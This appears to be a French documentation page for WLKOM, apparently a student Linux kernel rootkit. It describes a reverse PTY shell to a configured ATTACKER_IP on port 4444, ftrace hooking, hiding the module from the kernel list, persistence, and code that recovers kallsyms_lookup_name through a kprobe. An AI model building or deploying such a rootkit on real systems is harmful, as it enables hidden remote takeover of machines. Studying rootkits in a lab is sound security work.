---
id: kernel
title: Module Noyau
sidebar_position: 3
---

# Module Noyau Linux (LKM)

**Qu'est-ce qu'un LKM ?**

Un **Loadable Kernel Module (LKM)** est un morceau de code pouvant être chargé et déchargé dynamiquement dans le noyau Linux sans nécessiter de reboot. Il s'exécute dans le **ring 0** (espace noyau), avec un accès complet à toutes les ressources du système. C'est le mécanisme officiel pour les pilotes de périphériques, mais WLKOM en détourne l'usage pour créer un rootkit furtif.

Un LKM expose deux points d'entrée obligatoires : `module_init()` appelé au chargement, et `module_exit()` appelé au déchargement. Le fichier compilé porte l'extension `.ko` (Kernel Object).

## Métadonnées du module

```c
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robin,Joaquim,Lucas");
MODULE_DESCRIPTION("WLKOM Rootkit - PTY Shell + Stealth + Persistence");
MODULE_VERSION("0.5");

/* Constantes de configuration */
#define ATTACKER_IP   "192.168.122.101"
#define PORT          4444
#define RETRY_DELAY   5000      /* ms entre deux tentatives */
#define HIDE_PREFIX   "wlkom"   /* préfixe des entrées à cacher */
```

## Référence complète des fonctions

### Initialisation & Nettoyage

| Fonction | Signature | Rôle | Détails techniques |
| :--- | :--- | :--- | :--- |
| `wlkom_init()` | `static int __init` | Point d'entrée du module | Appelée par le kernel lors de `insmod`/`modprobe`. Orchestre dans l'ordre : lock du module, installation du hook ftrace, suppression de la liste interne, lancement du kthread shell. Retourne 0 si succès. |
| `wlkom_exit()` | `static void __exit` | Point de sortie du module | Appelée lors du déchargement (normalement impossible grâce à try_module_get). Retire le hook ftrace, stoppe le kthread via `kthread_stop()` + `wake_up_interruptible()`. |

### Résolution de symboles noyau

**Pourquoi resolve_symbol() est nécessaire ?**
Depuis Linux 5.7, la fonction `kallsyms_lookup_name()` n'est plus exportée publiquement aux modules. Elle permettait de retrouver l'adresse mémoire de n'importe quelle fonction noyau par son nom. WLKOM la retrouve via une technique de **kprobe** : on enregistre temporairement une sonde sur le symbole lui-même pour lire son adresse depuis le champ `kp.addr`, puis on désenregistre immédiatement la sonde.

| Fonction | Paramètre | Retour | Mécanisme |
| :--- | :--- | :--- | :--- |
| `resolve_symbol()` | `const char *name` | `unsigned long` (adresse) | Crée un `struct kprobe` avec `symbol_name = "kallsyms_lookup_name"`, appelle `register_kprobe()` pour récupérer l'adresse, cast le pointeur en `kallsyms_lookup_name_t`, puis invoque la fonction réelle sur `name`. |

```c
static unsigned long resolve_symbol(const char *name)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    kallsyms_lookup_name_t fn;
    unsigned long addr;

    if (register_kprobe(&kp) < 0)
        return 0;                  // échec
    fn = (kallsyms_lookup_name_t)kp.addr;   // adresse de kallsyms
    unregister_kprobe(&kp);     // libère la sonde immédiatement

    addr = fn(name);             // cherche le symbole demandé
    return addr;
}
```

## Makefile du module

### Cibles disponibles

| Cible | Commande | Action |
| :--- | :--- | :--- |
| **all** | `make` | Compile wlkom.ko via le système de build du noyau (kbuild). Invoque `make -C /lib/modules/$(uname -r)/build M=$(PWD) modules` |
| **uninstall** | `sudo make uninstall` | Tente de retirer le module, désactive et supprime wlkom.service, et supprime les fichiers de persistance. Un reboot reste indispensable pour décharger complètement le LKM verrouillé. |
| **clean** | `make clean` | Supprime les artefacts de compilation (.ko, .o, .mod, etc.) |
